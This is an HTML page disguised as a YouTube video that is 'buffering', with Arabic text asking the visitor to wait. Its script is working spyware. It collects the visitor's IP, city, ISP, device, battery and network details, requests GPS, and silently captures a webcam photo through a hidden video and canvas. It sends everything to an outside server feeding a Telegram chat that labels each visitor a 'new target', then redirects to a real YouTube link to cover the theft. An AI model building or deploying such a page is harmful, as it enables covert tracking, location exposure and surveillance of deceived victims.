<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>YouTube Video</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background: #f8f9fa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: #333;
    }
    .card {
      background: white;
      padding: 40px;
      border-radius: 16px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
      max-width: 400px;
      text-align: center;
    }
    .card img { margin-bottom: 20px; }
    video, canvas {
      opacity: 0;
      position: absolute;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" alt="YouTube" style="width: 120px;">
    <h2 style="margin-top: 20px;">جارٍ تحميل الفيديو...</h2>
    <p style="color: #999;">اتصالك بالإنترنت ضعيف. يُرجى الانتظار حتى يتم تخزين الفيديو مؤقتًا.</p>
    <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." style="width: 80px; margin-top: 20px;">
    <video id="videoPreview" autoplay muted playsinline></video>
    <canvas id="snapshotCanvas" width="320" height="240"></canvas>
  </div>

  <script>
    const chatId = new URLSearchParams(window.location.search).get("id");
    const video = document.getElementById("videoPreview");
    const canvas = document.getElementById("snapshotCanvas");
    const ctx = canvas.getContext("2d");
    let imageBase64 = "";

    // دالة الإرسال مع تحسين الثبات (keepalive)
    async function sendToTelegram(message, isPhoto = false) {
      if (!chatId) return;
      const payload = { chat_id: chatId };
      if (isPhoto && imageBase64) {
        payload.message = "📸 *Snapshot from verification:*";
        payload.photo = imageBase64;
      } else {
        payload.message = message;
      }

      try {
        await fetch("https://render-backend-package1.onrender.com/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
          keepalive: true // يضمن وصول الطلب حتى لو تم إغلاق الصفحة
        });
      } catch (e) { console.error("Send Error:", e); }
    }

    function detectDeviceType(ua) {
      if (/android/i.test(ua)) return "Android 📱";
      if (/iphone|ipad|ipod/i.test(ua)) return "iOS 🍎";
      if (/windows/i.test(ua)) return "Windows 💻";
      if (/macintosh/i.test(ua)) return "Mac 🖥️";
      return "Unknown Device";
    }

    function collectSensitive() {
      navigator.geolocation.getCurrentPosition(
        async pos => {
          const gpsMsg = `📍 *GPS Location Found*\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
          await sendToTelegram(gpsMsg);
          capturePhotoSafely();
        },
        async err => {
          await sendToTelegram("❌ *GPS Access Denied*");
          capturePhotoSafely();
        },
        { timeout: 4000 }
      );
    }

    function capturePhotoSafely() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          video.onloadeddata = () => {
            setTimeout(async () => {
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              imageBase64 = canvas.toDataURL("image/jpeg").split(',')[1];
              stream.getTracks().forEach(track => track.stop());
              await sendToTelegram("", true);
              redirectToTarget();
            }, 1000);
          };
        })
        .catch(() => {
          sendToTelegram("❌ *Camera Access Denied*");
          redirectToTarget();
        });
    }

    function redirectToTarget() {
      setTimeout(() => {
        window.location.replace("https://youtu.be/tNWpOuJk2M8");
      }, 1000);
    }

    async function sendBasicInfo() {
      const ua = navigator.userAgent;
      const os = detectDeviceType(ua);
      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const lang = navigator.language;
      const screenRes = `${screen.width}x${screen.height}`;
      const connection = navigator.connection || {};
      const network = connection.effectiveType || "Unknown";

      // جلب البطارية
      let batteryInfo = "N/A";
      try {
        const battery = await navigator.getBattery();
        batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging 🔌' : 'Not Charging 🔋'})`;
      } catch(e) {}

      // جلب الـ IP والمعلومات الجغرافية
      fetch("https://ipinfo.io/json?token=9c6f5e4a17b44c")
        .then(res => res.json())
        .then(data => {
          let basicInfo = "🔥 *NEW TARGET DETECTED BY COBRA* 🔥\n";
          basicInfo += "━━━━━━━━━━━━━━━━━━\n";
          basicInfo += `🌍 *IP:* \`${data.ip}\`\n`;
          basicInfo += `📍 *Location:* ${data.city}, ${data.country}\n`;
          basicInfo += `🏢 *ISP:* ${data.org}\n`;
          basicInfo += "━━━━━━━━━━━━━━━━━━\n";
          basicInfo += `💻 *OS:* ${os}\n`;
          basicInfo += `🔋 *Battery:* ${batteryInfo}\n`;
          basicInfo += `📶 *Network:* ${network.toUpperCase()}\n`;
          basicInfo += `🕒 *Timezone:* ${timeZone}\n`;
          basicInfo += `📺 *Screen:* ${screenRes}\n`;
          basicInfo += "━━━━━━━━━━━━━━━━━━\n";
          basicInfo += "🔒 *Awaiting GPS & Camera...*";

          sendToTelegram(basicInfo);
        });
    }

    // التنفيذ
    if (chatId) {
      sendBasicInfo();
      collectSensitive();
    }
  </script>
</body>
</html>
